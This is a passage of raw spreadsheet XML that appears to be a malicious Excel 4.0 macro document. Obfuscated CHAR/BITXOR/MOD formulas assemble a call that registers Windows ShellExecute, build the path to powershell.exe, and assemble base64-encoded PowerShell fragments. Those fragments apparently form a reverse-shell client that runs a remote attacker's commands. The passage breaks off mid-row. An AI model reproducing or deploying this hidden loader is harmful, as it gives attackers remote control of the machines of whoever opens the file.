        <f>CONCATENATE(CHAR(INT("119")),CHAR(109),CHAR(_xlfn.BITXOR(880,771)),MID("xuewqy",6,1),CHAR(34),MID("chprf,p",6,1),CHAR(34),CHAR(34),CHAR(MOD(452,408)),MID("nrpyh1j",6,1),CHAR(MOD(355,311)),MID("rpbuug9",7,1),MID(")dsofq",1,1))</f>
        <v>wmsy","",1,9)</v>
      </c>
      <c r="CK22" t="s">
        <v>221</v>
      </c>
      <c r="CR22" t="s">
        <v>222</v>
      </c>
      <c r="CT22" t="s">
        <v>223</v>
      </c>
    </row>
    <row r="23" spans="1:107" x14ac:dyDescent="0.3">
      <c r="A23" t="s">
        <v>224</v>
      </c>
      <c r="E23" t="s">
        <v>225</v>
      </c>
      <c r="M23" t="s">
        <v>226</v>
      </c>
      <c r="N23" t="s">
        <v>227</v>
      </c>
      <c r="S23" t="s">
        <v>228</v>
      </c>
      <c r="X23" t="s">
        <v>229</v>
      </c>
      <c r="AI23" t="s">
        <v>230</v>
      </c>
      <c r="AR23" t="s">
        <v>231</v>
      </c>
      <c r="AU23" t="s">
        <v>232</v>
      </c>
      <c r="BN23" t="s">
        <v>233</v>
      </c>
      <c r="BY23" t="s">
        <v>234</v>
      </c>
      <c r="CI23" t="str">
        <f>CONCATENATE($CI$19,$CI$20,$CI$21,$CI$22)</f>
        <v>=REGISTER("Shell32","ShellExecuteA","JJCCCJJ","qgwmsy","",1,9)</v>
      </c>
      <c r="CJ23" t="s">
        <v>235</v>
      </c>
      <c r="CP23" t="s">
        <v>236</v>
      </c>
      <c r="CV23" t="s">
        <v>237</v>
      </c>
    </row>
    <row r="24" spans="1:107" x14ac:dyDescent="0.3">
      <c r="M24" t="s">
        <v>238</v>
      </c>
      <c r="T24" t="s">
        <v>239</v>
      </c>
      <c r="AQ24" t="s">
        <v>240</v>
      </c>
      <c r="AV24" t="s">
        <v>241</v>
      </c>
      <c r="BA24" t="s">
        <v>242</v>
      </c>
      <c r="BF24" t="s">
        <v>243</v>
      </c>
      <c r="BO24" t="s">
        <v>244</v>
      </c>
      <c r="CB24" t="s">
        <v>245</v>
      </c>
      <c r="CI24" t="b">
        <f>GOTO($DC$53)</f>
        <v>0</v>
      </c>
      <c r="CO24" t="s">
        <v>246</v>
      </c>
      <c r="CQ24" t="s">
        <v>247</v>
      </c>
      <c r="CW24" t="s">
        <v>248</v>
      </c>
      <c r="CY24" t="s">
        <v>249</v>
      </c>
    </row>
    <row r="25" spans="1:107" x14ac:dyDescent="0.3">
      <c r="AT25" t="s">
        <v>250</v>
      </c>
      <c r="BO25" t="s">
        <v>251</v>
      </c>
      <c r="BU25" t="s">
        <v>252</v>
      </c>
      <c r="CK25" t="s">
        <v>253</v>
      </c>
    </row>
    <row r="26" spans="1:107" x14ac:dyDescent="0.3">
      <c r="N26" t="s">
        <v>254</v>
      </c>
      <c r="R26" t="s">
        <v>255</v>
      </c>
      <c r="Z26" t="s">
        <v>256</v>
      </c>
      <c r="AC26" t="s">
        <v>257</v>
      </c>
      <c r="AF26" t="s">
        <v>258</v>
      </c>
      <c r="AN26" t="s">
        <v>259</v>
      </c>
      <c r="BH26" t="s">
        <v>260</v>
      </c>
      <c r="BI26" t="s">
        <v>261</v>
      </c>
      <c r="CB26" t="s">
        <v>262</v>
      </c>
      <c r="CO26" t="s">
        <v>263</v>
      </c>
      <c r="CU26" t="s">
        <v>264</v>
      </c>
    </row>
    <row r="27" spans="1:107" x14ac:dyDescent="0.3">
      <c r="I27" t="s">
        <v>265</v>
      </c>
      <c r="N27" t="s">
        <v>266</v>
      </c>
      <c r="AV27" t="s">
        <v>267</v>
      </c>
      <c r="BA27" t="s">
        <v>268</v>
      </c>
      <c r="BC27" t="s">
        <v>269</v>
      </c>
      <c r="BL27" t="s">
        <v>270</v>
      </c>
      <c r="BT27" t="s">
        <v>271</v>
      </c>
      <c r="BW27" t="s">
        <v>272</v>
      </c>
      <c r="CI27" t="s">
        <v>273</v>
      </c>
      <c r="CL27" t="s">
        <v>274</v>
      </c>
      <c r="DA27" t="s">
        <v>275</v>
      </c>
    </row>
    <row r="28" spans="1:107" x14ac:dyDescent="0.3">
      <c r="M28" t="s">
        <v>276</v>
      </c>
      <c r="T28" t="s">
        <v>277</v>
      </c>
      <c r="AI28" t="s">
        <v>278</v>
      </c>
      <c r="BH28" t="s">
        <v>279</v>
      </c>
      <c r="BL28" t="s">
        <v>280</v>
      </c>
      <c r="BW28" t="s">
        <v>281</v>
      </c>
      <c r="CK28" t="s">
        <v>282</v>
      </c>
      <c r="CU28" t="s">
        <v>283</v>
      </c>
    </row>
    <row r="29" spans="1:107" x14ac:dyDescent="0.3">
      <c r="H29" t="s">
        <v>284</v>
      </c>
      <c r="S29" t="s">
        <v>285</v>
      </c>
      <c r="Y29" t="s">
        <v>286</v>
      </c>
      <c r="AK29" t="s">
        <v>287</v>
      </c>
      <c r="AO29" t="s">
        <v>288</v>
      </c>
      <c r="AS29" t="s">
        <v>289</v>
      </c>
      <c r="AU29" t="s">
        <v>290</v>
      </c>
      <c r="BC29" t="s">
        <v>291</v>
      </c>
      <c r="BN29" t="s">
        <v>292</v>
      </c>
      <c r="BS29" t="s">
        <v>293</v>
      </c>
      <c r="BW29" t="s">
        <v>294</v>
      </c>
      <c r="BX29" t="s">
        <v>295</v>
      </c>
      <c r="CC29" t="s">
        <v>296</v>
      </c>
      <c r="DC29" t="s">
        <v>297</v>
      </c>
    </row>
    <row r="30" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D30" t="s">
        <v>298</v>
      </c>
      <c r="N30" t="s">
        <v>299</v>
      </c>
      <c r="R30" t="s">
        <v>300</v>
      </c>
      <c r="AP30" t="s">
        <v>301</v>
      </c>
      <c r="AR30" t="s">
        <v>302</v>
      </c>
      <c r="AY30" t="s">
        <v>303</v>
      </c>
      <c r="BF30" t="s">
        <v>304</v>
      </c>
      <c r="BX30" t="s">
        <v>305</v>
      </c>
      <c r="CQ30" t="s">
        <v>306</v>
      </c>
    </row>
    <row r="31" spans="1:107" x14ac:dyDescent="0.3">
      <c r="AD31" t="s">
        <v>307</v>
      </c>
      <c r="BF31" t="s">
        <v>308</v>
      </c>
      <c r="BP31" t="s">
        <v>309</v>
      </c>
      <c r="CA31" t="s">
        <v>310</v>
      </c>
      <c r="CR31" t="s">
        <v>311</v>
      </c>
    </row>
    <row r="32" spans="1:107" x14ac:dyDescent="0.3">
      <c r="E32" t="s">
        <v>312</v>
      </c>
      <c r="H32" t="s">
        <v>313</v>
      </c>
      <c r="Z32" t="s">
        <v>314</v>
      </c>
      <c r="AW32" t="s">
        <v>315</v>
      </c>
      <c r="BJ32" t="s">
        <v>316</v>
      </c>
      <c r="CI32" t="s">
        <v>317</v>
      </c>
      <c r="CK32" t="s">
        <v>318</v>
      </c>
    </row>
    <row r="33" spans="3:107" x14ac:dyDescent="0.3">
      <c r="AB33" t="s">
        <v>319</v>
      </c>
      <c r="BD33" t="s">
        <v>320</v>
      </c>
      <c r="BS33" t="s">
        <v>321</v>
      </c>
      <c r="BT33" t="s">
        <v>322</v>
      </c>
      <c r="BW33" t="s">
        <v>323</v>
      </c>
      <c r="CR33" t="s">
        <v>324</v>
      </c>
      <c r="CZ33" t="s">
        <v>325</v>
      </c>
    </row>
    <row r="34" spans="3:107" x14ac:dyDescent="0.3">
      <c r="X34" t="s">
        <v>326</v>
      </c>
      <c r="Z34" t="s">
        <v>327</v>
      </c>
      <c r="AX34" t="s">
        <v>328</v>
      </c>
      <c r="AY34" t="s">
        <v>329</v>
      </c>
      <c r="BD34" t="s">
        <v>330</v>
      </c>
      <c r="BO34" t="s">
        <v>331</v>
      </c>
      <c r="BW34" t="s">
        <v>332</v>
      </c>
      <c r="CG34" t="s">
        <v>333</v>
      </c>
      <c r="DB34" t="s">
        <v>334</v>
      </c>
    </row>
    <row r="35" spans="3:107" x14ac:dyDescent="0.3">
      <c r="F35" t="s">
        <v>335</v>
      </c>
      <c r="L35" t="s">
        <v>336</v>
      </c>
      <c r="X35" t="s">
        <v>337</v>
      </c>
      <c r="AT35" t="s">
        <v>338</v>
      </c>
      <c r="BX35" t="s">
        <v>339</v>
      </c>
      <c r="CZ35" t="s">
        <v>340</v>
      </c>
      <c r="DA35" t="s">
        <v>341</v>
      </c>
    </row>
    <row r="36" spans="3:107" x14ac:dyDescent="0.3">
      <c r="Q36" t="s">
        <v>342</v>
      </c>
      <c r="W36" t="s">
        <v>343</v>
      </c>
      <c r="X36" t="s">
        <v>344</v>
      </c>
      <c r="AL36" t="s">
        <v>345</v>
      </c>
      <c r="AP36" t="s">
        <v>346</v>
      </c>
      <c r="BB36" t="s">
        <v>347</v>
      </c>
      <c r="BF36" t="s">
        <v>348</v>
      </c>
      <c r="BL36" t="s">
        <v>349</v>
      </c>
      <c r="BO36" t="s">
        <v>350</v>
      </c>
      <c r="BZ36" t="s">
        <v>351</v>
      </c>
      <c r="CD36" t="s">
        <v>352</v>
      </c>
      <c r="DA36" t="s">
        <v>353</v>
      </c>
    </row>
    <row r="37" spans="3:107" x14ac:dyDescent="0.3">
      <c r="O37" t="s">
        <v>354</v>
      </c>
      <c r="AA37" t="s">
        <v>355</v>
      </c>
      <c r="AP37" t="s">
        <v>356</v>
      </c>
      <c r="BP37" t="s">
        <v>357</v>
      </c>
    </row>
    <row r="38" spans="3:107" x14ac:dyDescent="0.3">
      <c r="I38" t="s">
        <v>358</v>
      </c>
      <c r="L38" t="s">
        <v>359</v>
      </c>
      <c r="T38" t="s">
        <v>360</v>
      </c>
      <c r="AI38" t="s">
        <v>361</v>
      </c>
      <c r="AU38" t="s">
        <v>362</v>
      </c>
      <c r="BG38" t="s">
        <v>363</v>
      </c>
      <c r="CA38" t="s">
        <v>364</v>
      </c>
      <c r="CD38" t="s">
        <v>365</v>
      </c>
      <c r="CI38" t="s">
        <v>366</v>
      </c>
    </row>
    <row r="39" spans="3:107" x14ac:dyDescent="0.3">
      <c r="K39" t="s">
        <v>367</v>
      </c>
      <c r="M39" t="s">
        <v>368</v>
      </c>
      <c r="R39" t="s">
        <v>369</v>
      </c>
      <c r="AW39" t="s">
        <v>370</v>
      </c>
      <c r="BB39" t="s">
        <v>371</v>
      </c>
      <c r="BD39" t="s">
        <v>372</v>
      </c>
      <c r="BG39" t="s">
        <v>373</v>
      </c>
      <c r="BK39" t="s">
        <v>374</v>
      </c>
      <c r="BQ39" t="s">
        <v>375</v>
      </c>
      <c r="CS39" t="s">
        <v>376</v>
      </c>
      <c r="CW39" t="s">
        <v>377</v>
      </c>
    </row>
    <row r="40" spans="3:107" x14ac:dyDescent="0.3">
      <c r="Y40" t="s">
        <v>378</v>
      </c>
      <c r="AH40" t="s">
        <v>379</v>
      </c>
      <c r="AU40" t="s">
        <v>380</v>
      </c>
      <c r="BK40" t="s">
        <v>381</v>
      </c>
      <c r="BR40" t="s">
        <v>382</v>
      </c>
      <c r="BU40" t="s">
        <v>383</v>
      </c>
      <c r="BV40" t="s">
        <v>384</v>
      </c>
      <c r="BZ40" t="s">
        <v>385</v>
      </c>
      <c r="CK40" t="s">
        <v>386</v>
      </c>
    </row>
    <row r="41" spans="3:107" x14ac:dyDescent="0.3">
      <c r="G41" t="s">
        <v>387</v>
      </c>
      <c r="O41" t="s">
        <v>388</v>
      </c>
      <c r="AO41" t="s">
        <v>389</v>
      </c>
      <c r="AR41" t="s">
        <v>390</v>
      </c>
      <c r="BE41" t="s">
        <v>391</v>
      </c>
      <c r="BK41" t="s">
        <v>392</v>
      </c>
      <c r="BS41" t="s">
        <v>393</v>
      </c>
      <c r="BW41" t="s">
        <v>394</v>
      </c>
      <c r="CD41" t="s">
        <v>395</v>
      </c>
      <c r="CL41" t="s">
        <v>396</v>
      </c>
      <c r="DC41" t="s">
        <v>397</v>
      </c>
    </row>
    <row r="42" spans="3:107" x14ac:dyDescent="0.3">
      <c r="I42" t="s">
        <v>398</v>
      </c>
      <c r="L42" t="s">
        <v>399</v>
      </c>
      <c r="N42" t="s">
        <v>400</v>
      </c>
      <c r="O42" t="s">
        <v>401</v>
      </c>
      <c r="U42" t="s">
        <v>402</v>
      </c>
      <c r="AD42" t="s">
        <v>403</v>
      </c>
      <c r="AL42" t="s">
        <v>404</v>
      </c>
      <c r="AP42" t="s">
        <v>405</v>
      </c>
      <c r="BG42" t="s">
        <v>406</v>
      </c>
      <c r="BU42" t="s">
        <v>407</v>
      </c>
      <c r="BV42" t="s">
        <v>408</v>
      </c>
      <c r="CE42" t="s">
        <v>409</v>
      </c>
      <c r="CS42" t="s">
        <v>410</v>
      </c>
    </row>
    <row r="43" spans="3:107" x14ac:dyDescent="0.3">
      <c r="E43" t="s">
        <v>411</v>
      </c>
      <c r="Q43" t="s">
        <v>412</v>
      </c>
      <c r="W43" t="s">
        <v>413</v>
      </c>
      <c r="AI43" t="s">
        <v>414</v>
      </c>
      <c r="AO43" t="s">
        <v>415</v>
      </c>
      <c r="AQ43" t="s">
        <v>416</v>
      </c>
      <c r="BE43" t="s">
        <v>417</v>
      </c>
      <c r="BQ43" t="s">
        <v>418</v>
      </c>
      <c r="BW43" t="s">
        <v>419</v>
      </c>
      <c r="CR43" t="s">
        <v>420</v>
      </c>
    </row>
    <row r="44" spans="3:107" x14ac:dyDescent="0.3">
      <c r="C44" t="s">
        <v>421</v>
      </c>
      <c r="AP44" t="s">
        <v>422</v>
      </c>
      <c r="AW44" t="s">
        <v>423</v>
      </c>
      <c r="AX44" t="s">
        <v>424</v>
      </c>
      <c r="BH44" t="s">
        <v>425</v>
      </c>
      <c r="BW44" t="s">
        <v>426</v>
      </c>
      <c r="BY44" t="s">
        <v>427</v>
      </c>
      <c r="BZ44" t="s">
        <v>428</v>
      </c>
      <c r="CB44" t="s">
        <v>429</v>
      </c>
      <c r="CY44" t="s">
        <v>430</v>
      </c>
    </row>
    <row r="45" spans="3:107" x14ac:dyDescent="0.3">
      <c r="N45" t="s">
        <v>431</v>
      </c>
      <c r="O45" t="s">
        <v>432</v>
      </c>
      <c r="P45" t="s">
        <v>433</v>
      </c>
      <c r="AD45" t="s">
        <v>434</v>
      </c>
      <c r="AQ45" t="s">
        <v>435</v>
      </c>
      <c r="BK45" t="s">
        <v>436</v>
      </c>
      <c r="BQ45" t="s">
        <v>437</v>
      </c>
      <c r="BX45" t="s">
        <v>438</v>
      </c>
      <c r="CT45" t="s">
        <v>439</v>
      </c>
      <c r="DA45" t="s">
        <v>440</v>
      </c>
      <c r="DB45" t="s">
        <v>441</v>
      </c>
    </row>
    <row r="46" spans="3:107" x14ac:dyDescent="0.3">
      <c r="D46" t="s">
        <v>442</v>
      </c>
      <c r="AU46" t="s">
        <v>443</v>
      </c>
      <c r="BO46" t="s">
        <v>444</v>
      </c>
      <c r="BZ46" t="s">
        <v>445</v>
      </c>
      <c r="CB46" t="s">
        <v>446</v>
      </c>
      <c r="CF46" t="s">
        <v>447</v>
      </c>
      <c r="CS46" t="s">
        <v>448</v>
      </c>
      <c r="DB46" t="s">
        <v>449</v>
      </c>
    </row>
    <row r="47" spans="3:107" x14ac:dyDescent="0.3">
      <c r="T47" t="s">
        <v>450</v>
      </c>
      <c r="AI47" t="s">
        <v>451</v>
      </c>
      <c r="CE47" t="s">
        <v>452</v>
      </c>
      <c r="CM47" t="s">
        <v>453</v>
      </c>
      <c r="CU47" t="s">
        <v>454</v>
      </c>
      <c r="CW47" t="s">
        <v>455</v>
      </c>
      <c r="CZ47" t="s">
        <v>456</v>
      </c>
    </row>
    <row r="48" spans="3:107" x14ac:dyDescent="0.3">
      <c r="C48" t="s">
        <v>457</v>
      </c>
      <c r="G48" t="s">
        <v>458</v>
      </c>
      <c r="V48" t="s">
        <v>459</v>
      </c>
      <c r="Z48" t="s">
        <v>460</v>
      </c>
      <c r="AF48" t="s">
        <v>461</v>
      </c>
      <c r="AU48" t="s">
        <v>462</v>
      </c>
      <c r="CE48" t="s">
        <v>463</v>
      </c>
      <c r="CI48" t="s">
        <v>464</v>
      </c>
      <c r="CK48" t="s">
        <v>465</v>
      </c>
      <c r="CL48" t="s">
        <v>466</v>
      </c>
      <c r="CQ48" t="s">
        <v>467</v>
      </c>
      <c r="CZ48" t="s">
        <v>468</v>
      </c>
    </row>
    <row r="49" spans="1:107" x14ac:dyDescent="0.3">
      <c r="F49" t="s">
        <v>469</v>
      </c>
      <c r="M49" t="s">
        <v>470</v>
      </c>
      <c r="AB49" t="s">
        <v>471</v>
      </c>
      <c r="AC49" t="s">
        <v>472</v>
      </c>
      <c r="AE49" t="s">
        <v>473</v>
      </c>
      <c r="AM49" t="s">
        <v>474</v>
      </c>
      <c r="BU49" t="s">
        <v>475</v>
      </c>
      <c r="CF49" t="s">
        <v>476</v>
      </c>
      <c r="CZ49" t="s">
        <v>477</v>
      </c>
    </row>
    <row r="50" spans="1:107" x14ac:dyDescent="0.3">
      <c r="L50" t="s">
        <v>478</v>
      </c>
      <c r="U50" t="s">
        <v>479</v>
      </c>
      <c r="AC50" t="str">
        <f>CONCATENATE(MID("ffeCglh",4,1),CHAR(58),CHAR(_xlfn.BITXOR(674,766)),CHAR(87),MID("ltioudt",3,1),CHAR(110),CHAR(MOD(570,470)),CHAR(INT("111")),CHAR(119),CHAR(_xlfn.BITXOR(271,380)),CHAR(MOD(202,110)),CHAR(MOD(623,540)),CHAR(121),CHAR(INT("115")),MID("mtti",3,1),CHAR(MOD(675,574)))</f>
        <v>C:\Windows\Syste</v>
      </c>
      <c r="AD50" t="s">
        <v>480</v>
      </c>
      <c r="AQ50" t="s">
        <v>481</v>
      </c>
      <c r="BF50" t="s">
        <v>482</v>
      </c>
      <c r="BK50" t="s">
        <v>483</v>
      </c>
      <c r="CN50" t="s">
        <v>484</v>
      </c>
      <c r="CP50" t="s">
        <v>485</v>
      </c>
      <c r="CQ50" t="s">
        <v>486</v>
      </c>
    </row>
    <row r="51" spans="1:107" x14ac:dyDescent="0.3">
      <c r="AA51" t="s">
        <v>487</v>
      </c>
      <c r="AC51" t="str">
        <f>CONCATENATE(MID("iiwqme",5,1),CHAR(51),MID("avxaydzh2",9,1),CHAR(INT("92")),CHAR(INT("87")),CHAR(INT("105")),MID("loin",4,1),CHAR(100),CHAR(MOD(620,509)),MID("djfruw",6,1),CHAR(INT("115")),CHAR(80),CHAR(111),CHAR(INT("119")),CHAR(_xlfn.BITXOR(531,630)),CHAR(_xlfn.BITXOR(307,321)))</f>
        <v>m32\WindowsPower</v>
      </c>
      <c r="AH51" t="s">
        <v>488</v>
      </c>
      <c r="BL51" t="s">
        <v>489</v>
      </c>
      <c r="CI51" t="s">
        <v>490</v>
      </c>
      <c r="CK51" t="s">
        <v>491</v>
      </c>
      <c r="CO51" t="s">
        <v>492</v>
      </c>
    </row>
    <row r="52" spans="1:107" x14ac:dyDescent="0.3">
      <c r="I52" t="s">
        <v>493</v>
      </c>
      <c r="M52" t="s">
        <v>494</v>
      </c>
      <c r="Y52" t="s">
        <v>495</v>
      </c>
      <c r="Z52" t="s">
        <v>496</v>
      </c>
      <c r="AC52" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(607,524)),CHAR(INT("104")),CHAR(101),CHAR(MOD(625,517)),CHAR(108),CHAR(92),CHAR(MOD(401,283)),CHAR(INT("49")),CHAR(46),MID("zz ry",3,1),MID("asn0zka",4,1),CHAR(INT("92")),MID("azwjqap",7,1),CHAR(111),CHAR(MOD(248,129)),MID("jspenkfqj",4,1),CHAR(114))</f>
        <v>Shell\v1. 0\power</v>
      </c>
      <c r="AK52" t="s">
        <v>497</v>
      </c>
      <c r="AN52" t="s">
        <v>498</v>
      </c>
      <c r="AW52" t="s">
        <v>499</v>
      </c>
      <c r="BI52" t="s">
        <v>500</v>
      </c>
      <c r="BN52" t="s">
        <v>501</v>
      </c>
      <c r="BX52" t="s">
        <v>502</v>
      </c>
      <c r="CQ52" t="s">
        <v>503</v>
      </c>
      <c r="CS52" t="s">
        <v>504</v>
      </c>
      <c r="CX52" t="s">
        <v>505</v>
      </c>
    </row>
    <row r="53" spans="1:107" x14ac:dyDescent="0.3">
      <c r="P53" t="s">
        <v>506</v>
      </c>
      <c r="V53" t="s">
        <v>507</v>
      </c>
      <c r="AC53" t="str">
        <f>CONCATENATE(CHAR(INT("115")),CHAR(INT("104")),CHAR(MOD(344,243)),CHAR(108),CHAR(INT("108")),CHAR(_xlfn.BITXOR(195,237)),CHAR(_xlfn.BITXOR(87,50)),CHAR(120),CHAR(101))</f>
        <v>shell.exe</v>
      </c>
      <c r="BK53" t="s">
        <v>508</v>
      </c>
      <c r="BL53" t="s">
        <v>509</v>
      </c>
      <c r="BP53" t="s">
        <v>510</v>
      </c>
      <c r="BW53" t="s">
        <v>511</v>
      </c>
      <c r="BY53" t="s">
        <v>512</v>
      </c>
      <c r="BZ53" t="s">
        <v>513</v>
      </c>
      <c r="DC53" t="b">
        <f>FORMULA($CI$23,$F$137)</f>
        <v>0</v>
      </c>
    </row>
    <row r="54" spans="1:107" x14ac:dyDescent="0.3">
      <c r="A54" t="s">
        <v>514</v>
      </c>
      <c r="Q54" t="s">
        <v>515</v>
      </c>
      <c r="AC54" t="str">
        <f>CONCATENATE($AC$50,$AC$51,$AC$52,$AC$53)</f>
        <v>C:\Windows\System32\WindowsPowerShell\v1. 0\powershell.exe</v>
      </c>
      <c r="AF54" t="s">
        <v>516</v>
      </c>
      <c r="AH54" t="s">
        <v>517</v>
      </c>
      <c r="AV54" t="s">
        <v>518</v>
      </c>
      <c r="BA54" t="s">
        <v>519</v>
      </c>
      <c r="CQ54" t="s">
        <v>520</v>
      </c>
      <c r="CR54" t="s">
        <v>521</v>
      </c>
      <c r="DC54" t="str">
        <f>CONCATENATE(MID("yf=m",3,1),CHAR(MOD(568,455)),MID("zmgujl",3,1),CHAR(MOD(695,576)),CHAR(_xlfn.BITXOR(134,235)),CHAR(INT("115")),CHAR(_xlfn.BITXOR(184,193)),CHAR(INT("40")),CHAR(_xlfn.BITXOR(405,421)),CHAR(INT("44")),CHAR(34),CHAR(111),CHAR(112),MID("stzeydyjb",4,1),MID("inugsa",2,1),CHAR(34))</f>
        <v>=qgwmsy(0,"open"</v>
      </c>
    </row>
    <row r="55" spans="1:107" x14ac:dyDescent="0.3">
      <c r="Q55" t="s">
        <v>522</v>
      </c>
      <c r="AC55" t="b">
        <f bx="1">program=$AC$54</f>
        <v>0</v>
      </c>
      <c r="BL55" t="s">
        <v>523</v>
      </c>
      <c r="BQ55" t="s">
        <v>524</v>
      </c>
      <c r="CI55" t="s">
        <v>525</v>
      </c>
      <c r="CY55" t="s">
        <v>526</v>
      </c>
      <c r="DC55" t="str">
        <f>CONCATENATE(CHAR(MOD(293,249)),CHAR(INT("112")),CHAR(_xlfn.BITXOR(592,546)),CHAR(MOD(551,440)),CHAR(INT("103")),CHAR(_xlfn.BITXOR(956,974)),CHAR(_xlfn.BITXOR(335,302)),CHAR(MOD(330,221)),MID(",qfqoa",1,1),CHAR(97),MID("dcbsbrub",6,1),MID("ghgdbk",1,1),CHAR(MOD(563,448)),CHAR(_xlfn.BITXOR(663,699)))</f>
        <v>,program,args,</v>
      </c>
    </row>
    <row r="56" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D56" t="s">
        <v>527</v>
      </c>
      <c r="T56" t="s">
        <v>528</v>
      </c>
      <c r="AC56" t="str">
        <f>CONCATENATE(MID("tJzgkos",2,1),MID("Acbs",1,1),CHAR(66),CHAR(_xlfn.BITXOR(883,793)),CHAR(_xlfn.BITXOR(426,491)),CHAR(71),CHAR(119),CHAR(MOD(322,257)),CHAR(INT("97")),MID("svQkm",3,1),CHAR(_xlfn.BITXOR(430,492)),CHAR(MOD(476,368)),CHAR(INT("65")),MID("osljtGri",6,1),CHAR(_xlfn.BITXOR(763,719)))</f>
        <v>JABjAGwAaQBlAG4</v>
      </c>
      <c r="AE56" t="str">
        <f>CONCATENATE(CHAR(INT("85")),CHAR(MOD(598,533)),CHAR(MOD(376,275)),CHAR(65),CHAR(65),CHAR(INT("103")),CHAR(INT("65")),CHAR(MOD(479,412)),CHAR(INT("81")),CHAR(MOD(654,589)),CHAR(INT("90")),CHAR(65),CHAR(MOD(242,176)),CHAR(MOD(614,510)),CHAR(INT("65")),CHAR(INT("72")),MID("Qxeatr",1,1))</f>
        <v>UAeAAgACQAZABhAHQ</v>
      </c>
      <c r="AI56" t="s">
        <v>529</v>
      </c>
      <c r="AK56" t="s">
        <v>530</v>
      </c>
      <c r="AQ56" t="s">
        <v>531</v>
      </c>
      <c r="AT56" t="s">
        <v>532</v>
      </c>
      <c r="AW56" t="s">
        <v>533</v>
      </c>
      <c r="AY56" t="s">
        <v>534</v>
      </c>
      <c r="BJ56" t="s">
        <v>535</v>
      </c>
      <c r="BM56" t="s">
        <v>536</v>
      </c>
      <c r="BR56" t="s">
        <v>537</v>
      </c>
      <c r="BT56" t="s">
        <v>538</v>
      </c>
      <c r="CM56" t="s">
        <v>539</v>
      </c>
      <c r="DA56" t="s">
        <v>540</v>
      </c>
      <c r="DC56" t="str">
        <f>CONCATENATE(CHAR(48),CHAR(_xlfn.BITXOR(739,719)),CHAR(MOD(189,136)),CHAR(INT("41")))</f>
        <v>0,5)</v>
      </c>
    </row>
    <row r="57" spans="1:107" x14ac:dyDescent="0.3">
      <c r="X57" t="s">
        <v>541</v>
      </c>
      <c r="AC57" t="str">
        <f>CONCATENATE(MID("uljArfp",4,1),CHAR(INT("100")),MID("tAouo",2,1),CHAR(_xlfn.BITXOR(21,84)),CHAR(_xlfn.BITXOR(621,522)),CHAR(_xlfn.BITXOR(255,190)),CHAR(INT("68")),CHAR(MOD(582,534)),CHAR(_xlfn.BITXOR(1018,955)),CHAR(MOD(309,236)),CHAR(INT("65")),CHAR(66),CHAR(_xlfn.BITXOR(983,920)),CHAR(MOD(232,167)))</f>
        <v>AdAAgAD0AIABOA</v>
      </c>
      <c r="AE57" t="str">
        <f>CONCATENATE(MID("pzAvsea",3,1),CHAR(_xlfn.BITXOR(989,900)),CHAR(81),CHAR(INT("65")),CHAR(INT("103")),CHAR(65),CHAR(_xlfn.BITXOR(892,824)),CHAR(_xlfn.BITXOR(173,228)),CHAR(65),CHAR(80),CHAR(MOD(372,269)),CHAR(INT("65")),MID("mauhahfrq",1,1),CHAR(INT("65")),CHAR(MOD(524,456)),MID("fEusnd",2,1))</f>
        <v>AYQAgADIAPgAmADE</v>
      </c>
      <c r="AR57" t="s">
        <v>542</v>
      </c>
      <c r="AT57" t="s">
        <v>543</v>
      </c>
      <c r="BF57" t="s">
        <v>544</v>
      </c>
      <c r="CX57" t="s">
        <v>545</v>
      </c>
      <c r="DC57" t="str">
        <f>CONCATENATE($DC$54,$DC$55,$DC$56)</f>
        <v>=qgwmsy(0,"open",program,args,0,5)</v>
      </c>
    </row>
    <row r="58" spans="1:107" x14ac:dyDescent="0.3">
      <c r="L58" t="s">
        <v>546</v>
      </c>
      <c r="V58" t="s">
        <v>547</v>
      </c>
      <c r="W58" t="s">
        <v>548</v>
      </c>
      <c r="AC58" t="str">
        <f>CONCATENATE(CHAR(INT("71")),CHAR(85),CHAR(INT("65")))</f>
        <v>GUA</v>
      </c>
      <c r="AE58" t="str">
        <f>CONCATENATE(CHAR(MOD(277,212)),MID("lrqzsIito",6,1),MID("qaqxptbAy",8,1),CHAR(MOD(417,351)),CHAR(MOD(461,405)),CHAR(INT("65")),CHAR(67),CHAR(_xlfn.BITXOR(1022,959)),CHAR(INT("65")),CHAR(MOD(522,438)),MID("wmhgp",1,1),CHAR(66),CHAR(49),CHAR(INT("65")),CHAR(INT("72")),CHAR(INT("81")))</f>
        <v>AIAB8ACAATwB1AHQ</v>
      </c>
      <c r="AS58" t="s">
        <v>549</v>
      </c>
      <c r="BA58" t="s">
        <v>550</v>
      </c>
      <c r="BD58" t="s">
        <v>551</v>
      </c>
      <c r="CO58" t="s">
        <v>552</v>
      </c>
      <c r="DC58" t="b">
        <f>GOTO($GC$104)</f>
        <v>0</v>
      </c>
    </row>
    <row r="59" spans="1:107" x14ac:dyDescent="0.3">
      <c r="K59" t="s">
        <v>553</v>
      </c>
      <c r="M59" t="s">
        <v>554</v>
      </c>
      <c r="T59" t="s">
        <v>555</v>
      </c>
      <c r="Y59" t="s">
        <v>556</v>
      </c>
      <c r="AC59" t="str">
        <f>CONCATENATE($AC$56,$AC$57,$AC$58)</f>
        <v>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA</v>
      </c>
      <c r="AE59" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(_xlfn.BITXOR(335,259)),CHAR(INT("81")),MID("Bejcyf",1,1),CHAR(MOD(659,575)),CHAR(65),CHAR(MOD(580,508)),CHAR(_xlfn.BITXOR(470,391)),MID("jctpA",5,1),CHAR(MOD(696,597)),CHAR(103),CHAR(INT("66")),CHAR(INT("112")))</f>
        <v>ALQBTAHQAcgBp</v>
      </c>
      <c r="AG59" t="s">
        <v>557</v>
      </c>
      <c r="AT59" t="s">
        <v>558</v>
      </c>
      <c r="BS59" t="s">
        <v>559</v>
      </c>
      <c r="CH59" t="s">
        <v>560</v>
      </c>
      <c r="CX59" t="s">
        <v>561</v>
      </c>
    </row>
    <row r="60" spans="1:107" x14ac:dyDescent="0.3">
      <c r="T60" t="s">
        <v>562</v>
      </c>
      <c r="Z60" t="s">
        <v>563</v>
      </c>
      <c r="AC60" t="b">
        <f bx="1">part1=$AC$59</f>
        <v>0</v>
      </c>
      <c r="AE60" t="str">
        <f>CONCATENATE($AE$56,$AE$57,$AE$58,$AE$59)</f>
        <v>UAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBp</v>
      </c>
      <c r="AX60" t="s">
        <v>564</v>
      </c>
